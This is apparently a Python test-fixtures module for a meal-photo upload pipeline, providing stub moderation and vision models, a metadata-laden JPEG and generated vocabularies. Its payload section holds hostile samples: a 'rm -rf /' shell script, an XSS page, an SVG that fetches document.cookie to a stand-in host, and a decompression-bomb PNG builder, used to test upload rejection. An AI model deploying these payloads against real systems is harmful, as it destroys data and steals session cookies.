"""Test doubles and fixture builders for the upload path.

These ship with the package rather than living in ``vision/tests`` because the
acceptance criteria on this feature are stated in terms of them, and because the
FastAPI app (issue #66) will want the same store double for its own route tests
rather than reinventing one.

:class:`StubImageAnalyzer` is here for the same reason: stage 3 fails closed,
and "fails closed" is only a claim a test can settle if the test can make
Content Safety unreachable on demand without reaching Azure to do it.

:func:`photo_with_location` is the interesting one. "EXIF is stripped" is only
a meaningful assertion if the fixture actually had EXIF to lose, and only a
*sufficient* assertion if the fixture also had the other places a camera writes
location: XMP, and a JPEG comment. This builder attaches all three, so a test
that finds none of them afterwards has proven something.
"""

import json
import struct
import textwrap
import threading
import zlib
from collections.abc import Iterator, Mapping, Sequence
from contextlib import contextmanager
from dataclasses import dataclass, field
from io import BytesIO
from types import ModuleType
from typing import Any

from PIL import Image

from chip_chat.otel import ToolName, agent_step, tool_call
from chip_chat.vision.moderation import ModerationUnavailableError, SafetyCategory
from chip_chat.vision.store import BlobRef
from chip_chat.vision.vocabulary import Vocabulary

__all__ = [
    "DEFAULT_TERMS",
    "DESCRIBED_MEAL",
    "ELF_BINARY",
    "GPS_LATITUDE_DEGREES",
    "GZIP_ARCHIVE",
    "HTML_PAGE",
    "PDF_DOCUMENT",
    "SHELL_SCRIPT",
    "SVG_WITH_SCRIPT",
    "XMP_LOCATION_MARKER",
    "ZIP_ARCHIVE",
    "InMemoryBlobStore",
    "StoredBlob",
    "StubImageAnalyzer",
    "StubVisionModel",
    "generated_vocabulary",
    "photo_tool_call",
    "photo_with_location",
    "png_declaring",
    "safe_severities",
    "solid_image",
    "vocabulary_module",
    "vocabulary_module_source",
]

GPS_LATITUDE_DEGREES = 41
"""The degrees field of the fixture's GPS tag. Recognisable in a raw byte scan."""

XMP_LOCATION_MARKER = b"exif:GPSLatitude"
"""A string that appears in the fixture's XMP packet and nowhere else."""

JPEG_COMMENT = b"chip-chat-fixture-comment"
"""A JPEG COM segment, the third place metadata hides."""


@dataclass(frozen=True, slots=True)
class StoredBlob:
    """One blob an :class:`InMemoryBlobStore` was asked to write."""

    name: str
    data: bytes
    content_type: str


class InMemoryBlobStore:
    """A :class:`~chip_chat.vision.store.BlobStore` that keeps writes in a dict.

    Refuses to overwrite, exactly as the Azure one does, so a test that expects
    unique names is actually testing for them.
    """

    __slots__ = ("_blobs", "_container", "_lock")

    def __init__(self, container: str = "uploads") -> None:
        """Initialise the store.

        Args:
            container: The container name reported to callers.
        """
        self._container = container
        self._lock = threading.Lock()
        self._blobs: dict[str, StoredBlob] = {}

    @property
    def container(self) -> str:
        return self._container

    def put(self, name: str, data: bytes, *, content_type: str) -> None:
        with self._lock:
            if name in self._blobs:
                raise FileExistsError(name)
            self._blobs[name] = StoredBlob(
                name=name, data=data, content_type=content_type
            )

    def read(self, ref: BlobRef) -> bytes:
        """Return one blob's bytes, as a
        :class:`~chip_chat.vision.store.BlobReader` does.

        Args:
            ref: The reference stage 3 produced.

        Returns:
            The stored bytes.

        Raises:
            KeyError: If nothing was written under that name.
            ValueError: If the ref names a different container -- the same
                refusal the Azure reader makes, so a test that relies on it is
                testing the real behaviour.
        """
        if ref.container != self._container:
            raise ValueError(
                f"{ref} is not in this store's container ({self._container})"
            )
        return self.get(ref).data

    def get(self, ref: BlobRef | str) -> StoredBlob:
        """Read one blob back.

        Args:
            ref: The reference, or a bare blob name.

        Returns:
            What was written.

        Raises:
            KeyError: If nothing was written under that name.
        """
        name = ref.name if isinstance(ref, BlobRef) else ref
        with self._lock:
            return self._blobs[name]

    @property
    def names(self) -> tuple[str, ...]:
        """Every blob written, in write order."""
        with self._lock:
            return tuple(self._blobs)

    def __len__(self) -> int:
        with self._lock:
            return len(self._blobs)


def safe_severities() -> dict[str, int]:
    """Every category at zero -- what Content Safety says about a burrito bowl."""
    return {category.value: 0 for category in SafetyCategory}


class StubImageAnalyzer:
    """An :class:`~chip_chat.vision.moderation.ImageAnalyzer` that answers from a script.

    Records what it was handed, so a test can assert that stage 3 saw the
    *normalized* bytes rather than what was uploaded -- which is how "moderation
    runs after normalization" stops being a comment and becomes an assertion.
    """

    __slots__ = ("_severities", "_unavailable", "calls")

    def __init__(
        self,
        severities: Mapping[str, int] | None = None,
        *,
        unavailable: bool = False,
    ) -> None:
        """Initialise the analyzer.

        Args:
            severities: What to report, keyed by category name. Defaults to
                :func:`safe_severities`. Pass a partial mapping to exercise the
                "the service answered with a hole in it" path.
            unavailable: Raise
                :class:`~chip_chat.vision.moderation.ModerationUnavailableError`
                instead of answering, which is the outage stage 3 must fail
                closed on.
        """
        self._severities = safe_severities() if severities is None else dict(severities)
        self._unavailable = unavailable
        self.calls: list[bytes] = []

    def analyze(self, image: bytes) -> Mapping[str, int]:
        self.calls.append(image)
        if self._unavailable:
            raise ModerationUnavailableError("content safety is unreachable")
        return dict(self._severities)


def solid_image(
    size: tuple[int, int] = (64, 48),
    *,
    fmt: str = "JPEG",
    colour: tuple[int, int, int] = (120, 90, 60),
    mode: str = "RGB",
) -> bytes:
    """Encode a plain rectangle, with no metadata attached.

    Args:
        size: ``(width, height)`` in pixels.
        fmt: A Pillow format name -- ``JPEG``, ``PNG``, ``WEBP``.
        colour: The fill.
        mode: The image mode; ``RGBA`` to exercise the transparency path.

    Returns:
        The encoded bytes.
    """
    fill: tuple[int, ...] = colour if mode == "RGB" else (*colour, 255)
    image = Image.new(mode, size, fill)
    buffer = BytesIO()
    image.save(buffer, format=fmt)
    return buffer.getvalue()


def photo_with_location(
    size: tuple[int, int] = (64, 48), *, orientation: int = 1
) -> bytes:
    """Encode a JPEG carrying location data in all three places a camera writes it.

    EXIF GPS tags, an XMP packet, and a JPEG comment. A normalized copy of this
    that still contains any of them has not had its metadata stripped, whatever
    :meth:`~PIL.Image.Image.getexif` reports.

    Args:
        size: ``(width, height)`` in pixels.
        orientation: The EXIF orientation tag to record. 6 means "rotate 90
            degrees clockwise to display", which is what a phone held upright
            writes, and is the value that proves the transpose ran.

    Returns:
        The encoded JPEG bytes.
    """
    image = Image.new("RGB", size, (200, 40, 40))
    # One corner in a different colour, so a transpose is visible in the pixels
    # rather than only in a tag that the transpose is supposed to remove.
    image.paste((20, 20, 220), (0, 0, max(1, size[0] // 4), max(1, size[1] // 4)))

    exif = Image.Exif()
    exif[0x0112] = orientation  # Orientation
    exif[0x010F] = "ChipChatFixtures"  # Make
    exif[0x8825] = {  # GPSInfo
        1: "N",
        2: (GPS_LATITUDE_DEGREES, 52, 0),
        3: "W",
        4: (87, 37, 0),
    }

    xmp = (
        b'<?xpacket begin="\xef\xbb\xbf" id="W5M0MpCehiHzreSzNTczkc9d"?>'
        b'<x:xmpmeta xmlns:x="adobe:ns:meta/">'
        b'<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
        b'<rdf:Description xmlns:exif="http://ns.adobe.com/exif/1.0/" '
        b'exif:GPSLatitude="41,52.000000N" exif:GPSLongitude="87,37.000000W"/>'
        b'</rdf:RDF></x:xmpmeta><?xpacket end="w"?>'
    )

    buffer = BytesIO()
    image.save(
        buffer,
        format="JPEG",
        exif=exif,
        xmp=xmp,
        comment=JPEG_COMMENT,
        quality=95,
    )
    return buffer.getvalue()


# --- payloads that are not photographs ---------------------------------------
#
# Each one is something a real upload endpoint gets sent. They are built here
# rather than checked in as files so that what makes each one dangerous is
# legible in the source rather than in a hexdump. Issue #80 wants the same set.

ZIP_ARCHIVE = b"PK\x03\x04" + b"\x00" * 60
"""A zip. The classic thing to name ``holiday.jpg``."""

GZIP_ARCHIVE = b"\x1f\x8b\x08\x00" + b"\x00" * 32

ELF_BINARY = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 56
"""A Linux executable, in case anything downstream is ever tempted to run it."""

SHELL_SCRIPT = b"#!/bin/sh\nrm -rf /\n"

HTML_PAGE = b"<!DOCTYPE html><html><body><script>alert(1)</script></body></html>"
"""Served back with the wrong content type, this is stored XSS."""

SVG_WITH_SCRIPT = (
    b'<?xml version="1.0"?>'
    b'<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
    b"<script>fetch('https://example.invalid/'+document.cookie)</script>"
    b"</svg>"
)
"""The dangerous one.

SVG genuinely is an image format, browsers render it, and it can carry script
and remote references. It also has no magic number -- it is XML -- so a check
that asks "does this parse as an image" rather than "does this start with a
signature we allow" is exactly the check that lets it through.
"""

PDF_DOCUMENT = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n" + b"\x00" * 32
"""A real document, in a format the pipeline still does not decode."""


def png_declaring(width: int, height: int) -> bytes:
    """Build a tiny PNG whose header claims to be ``width`` by ``height``.

    The decompression bomb, in its honest form: the file is a few hundred bytes,
    the IHDR chunk is truthful PNG, and opening it the naive way asks for the
    memory the header describes. Patching a real PNG's header -- and fixing the
    chunk CRC, so nothing rejects it as merely corrupt -- is how you get a
    fixture that is dangerous for the right reason.

    Args:
        width: The width to declare.
        height: The height to declare.

    Returns:
        PNG bytes with a valid, and enormous, IHDR.
    """
    buffer = BytesIO()
    Image.new("L", (1, 1), 0).save(buffer, format="PNG")
    raw = bytearray(buffer.getvalue())

    # 8-byte signature, then a chunk: 4-byte length, 4-byte type, data, 4-byte CRC.
    # IHDR is always first and always 13 bytes: width, height, then five fields.
    ihdr_data = 8 + 4 + 4
    raw[ihdr_data : ihdr_data + 8] = struct.pack(">II", width, height)
    chunk = bytes(raw[ihdr_data - 4 : ihdr_data + 13])
    raw[ihdr_data + 13 : ihdr_data + 17] = struct.pack(">I", zlib.crc32(chunk))
    return bytes(raw)


# --- stage 4: the vocabulary, the model, and the span it must sit under -------
#
# The describe stage has no vocabulary of its own -- it loads one the catalogue
# build wrote -- so a test of it needs a generated module to load. These build
# one without a catalogue, a landing zone or a network.

DEFAULT_TERMS: Mapping[str, tuple[str, ...]] = {
    "vessel": ("bowl", "burrito"),
    "protein": ("chicken", "steak"),
    "rice": ("white_rice",),
    "beans": ("black_beans",),
    "salsas": ("fresh_tomato_salsa",),
    "toppings": ("cheese", "guacamole"),
}
"""A small vocabulary in the shape a real catalogue produces.

These are fixture terms, not a vocabulary anything ships with: the point of
:func:`generated_vocabulary` is that a test can hand the describer *any*
vocabulary and watch what it accepts change. ``tests/test_describe.py`` uses a
second, deliberately different one to prove exactly that.
"""


def vocabulary_module_source(
    terms: Mapping[str, Sequence[str]] | None = None,
    *,
    content_version: str = "0" * 64,
) -> str:
    """Render a module in the shape ``chip_chat.catalog.vocabulary`` writes.

    Mirrors ``render_module`` there: the same docstring header carrying the
    catalogue content version, one :class:`~enum.StrEnum` per slot, ``SLOT_ITEMS``
    and ``DESCRIBE_SCHEMA``. It is a mirror rather than a call because
    ``chip-chat-vision`` does not depend on ``chip-chat-catalog`` -- the
    generated module is loaded by name at runtime, not imported -- and a test
    fixture that reached for the generator would reintroduce the dependency the
    design removes. ``tests/fixtures/generated-vocabulary.py.txt`` is a copy of
    the real generator's output, and ``tests/test_vocabulary.py`` loads it, so
    the mirror is checked against the thing it mirrors.

    Args:
        terms: Slot name to the terms it publishes. Defaults to
            :data:`DEFAULT_TERMS`. A slot mapped to no terms renders an empty
            enum, which is what a catalogue with no salsa rows produces.
        content_version: The catalogue build to record in the docstring.

    Returns:
        Python source for a generated vocabulary module.
    """
    published = DEFAULT_TERMS if terms is None else terms
    lines = [
        '"""The vision model\'s slot vocabulary, generated from the catalogue.',
        "",
        "DO NOT EDIT. This module is written by ``chip_chat.catalog.vocabulary``.",
        "",
        "Catalogue content version:",
        f"    {content_version}",
        '"""',
        "",
        "from enum import StrEnum",
        "",
    ]
    for slot, values in published.items():
        lines.append(f"\n\nclass {_fixture_class(slot)}(StrEnum):")
        lines.append(f'    """Published {slot} the model may return."""')
        lines.append("")
        if not values:
            lines.append("    # The catalogue published no term for this slot.")
            lines.append("    pass")
            continue
        for value in values:
            lines.append(f"    {value.upper()} = {json.dumps(value)}")

    lines.append("\n\nSLOT_ITEMS: dict[str, dict[str, tuple[str, ...]]] = {")
    for slot, values in published.items():
        lines.append(f"    {json.dumps(slot)}: {{")
        for index, value in enumerate(values):
            resolves = "()" if slot in ("vessel", "protein") else f'("CMG-{index}",)'
            lines.append(f"        {json.dumps(value)}: {resolves},")
        lines.append("    },")
    lines.append("}")

    lines.append(
        textwrap.dedent(
            '''

            def _slot(values: list[str]) -> dict[str, object]:
                """One slot: a value from the catalogue, and how sure the model is."""
                return {
                    "type": "object",
                    "additionalProperties": False,
                    "required": ["value", "confidence"],
                    "properties": {
                        "value": {"type": "string", "enum": values},
                        "confidence": {
                            "type": "number", "minimum": 0, "maximum": 1
                        },
                    },
                }


            DESCRIBE_SCHEMA: dict[str, object] = {
                "type": "object",
                "additionalProperties": False,
                "required": ["is_chipotle_style", "meals_visible"],
                "properties": {
                    "is_chipotle_style": {"type": "boolean"},'''
        )
    )
    for slot in ("vessel", "protein", "rice", "beans"):
        values = list(published.get(slot, ()))
        lines.append(f"        {json.dumps(slot)}: _slot({json.dumps(values)}),")
    for slot in ("salsas", "toppings"):
        values = list(published.get(slot, ()))
        lines.append(
            f"        {json.dumps(slot)}: "
            f'{{"type": "array", "items": _slot({json.dumps(values)})}},'
        )
    lines.append('        "meals_visible": {"type": "integer", "minimum": 0},')
    lines.append('        "notes": {"type": "string"},')
    lines.append("    },")
    lines.append("}")
    return "\n".join(lines) + "\n"


def _fixture_class(slot: str) -> str:
    """Class name for a slot, the way the generator spells it."""
    stem = slot[:-1] if slot.endswith("s") else slot
    return "".join(part.capitalize() for part in stem.split("_"))


def vocabulary_module(
    source: str, name: str = "chip_chat_vision_vocabulary"
) -> ModuleType:
    """Execute generated source as a module, without writing a file.

    Args:
        source: Module source, from :func:`vocabulary_module_source` or read
            from a file the real generator wrote.
        name: The module's ``__name__``, which appears in
            :class:`~chip_chat.vision.vocabulary.VocabularyError` messages.

    Returns:
        The module, ready for
        :meth:`~chip_chat.vision.vocabulary.Vocabulary.from_module`.
    """
    module = ModuleType(name)
    exec(compile(source, f"<{name}>", "exec"), module.__dict__)
    return module


def generated_vocabulary(
    terms: Mapping[str, Sequence[str]] | None = None,
    *,
    content_version: str = "0" * 64,
) -> Vocabulary:
    """Build a :class:`~chip_chat.vision.vocabulary.Vocabulary` from fixture terms.

    Args:
        terms: Slot name to the terms it publishes. Defaults to
            :data:`DEFAULT_TERMS`.
        content_version: The catalogue build to record.

    Returns:
        The vocabulary, exactly as loading a generated module would produce it.
    """
    return Vocabulary.from_module(
        vocabulary_module(
            vocabulary_module_source(terms, content_version=content_version)
        )
    )


DESCRIBED_MEAL: Mapping[str, Any] = {
    "is_chipotle_style": True,
    "vessel": {"value": "bowl", "confidence": 0.94},
    "protein": {"value": "chicken", "confidence": 0.71},
    "rice": {"value": "white_rice", "confidence": 0.55},
    "beans": {"value": "black_beans", "confidence": 0.38},
    "salsas": [{"value": "fresh_tomato_salsa", "confidence": 0.62}],
    "toppings": [
        {"value": "cheese", "confidence": 0.83},
        {"value": "guacamole", "confidence": 0.29},
    ],
    "meals_visible": 1,
    "notes": "Looks like a generous scoop of everything.",
}
"""A well-formed stage-4 response over :data:`DEFAULT_TERMS`.

The confidences are deliberately all different. A fixture that answered 1.0 nine
times would make the calibration check in ``tests/test_describe.py`` pass for the
wrong reason, and would be the very shape issue #53's fourth acceptance criterion
is written to catch.
"""


@dataclass
class StubVisionModel:
    """A :class:`~chip_chat.vision.describe.VisionModel` that answers from a script.

    Records every call, so a test can assert what the describer actually sent --
    that the response format reached the API rather than the prompt, that the
    image bytes were the stored ones, that the prompt named no catalogue term.
    """

    response: str | None = None
    """The raw text to return. ``None`` means :data:`DESCRIBED_MEAL` as JSON.

    An empty *string* is a different thing and is passed through: a deployment
    that answers with nothing is a case stage 4 has to handle, and a stub that
    quietly substituted a good answer for it would hide that.
    """

    deployment: str = "gpt-4.1-mini-test"
    error: Exception | None = None
    """Raise this instead of answering -- the outage stage 4 must decline on."""

    calls: list[dict[str, Any]] = field(default_factory=list)

    def __post_init__(self) -> None:
        if self.response is None:
            self.response = json.dumps(DESCRIBED_MEAL)

    def describe(
        self,
        *,
        image: bytes,
        media_type: str,
        response_format: Mapping[str, Any],
        system_prompt: str,
        user_prompt: str,
    ) -> str:
        self.calls.append(
            {
                "image": image,
                "media_type": media_type,
                "response_format": response_format,
                "system_prompt": system_prompt,
                "user_prompt": user_prompt,
            }
        )
        if self.error is not None:
            raise self.error
        return self.response or ""


@contextmanager
def photo_tool_call(ref: BlobRef | str, *, step: int = 0) -> Iterator[None]:
    """Open the spans RFC-001 section 09 puts above ``vision.describe``.

    ``vision.describe`` is a child of ``tool.<tool_name>``, which is a child of
    ``agent.step``, and :mod:`chip_chat.otel` enforces that rather than
    documenting it -- so a test that calls
    :meth:`~chip_chat.vision.describe.MealDescriber.describe` outside one gets a
    :class:`~chip_chat.otel.spans.SpanSchemaError`. That is the schema working.
    This is what stops every such test from having to say so.

    Args:
        ref: The photograph the tool was called on. Recorded as the tool's
            argument, which is the *only* thing that crosses that boundary.
        step: The ``agent.step`` index.

    Yields:
        Nothing; the spans are the point.
    """
    with (
        agent_step(index=step),
        tool_call(ToolName.MATCH_MEAL_FROM_PHOTO, arguments={"image_ref": str(ref)}),
    ):
        yield
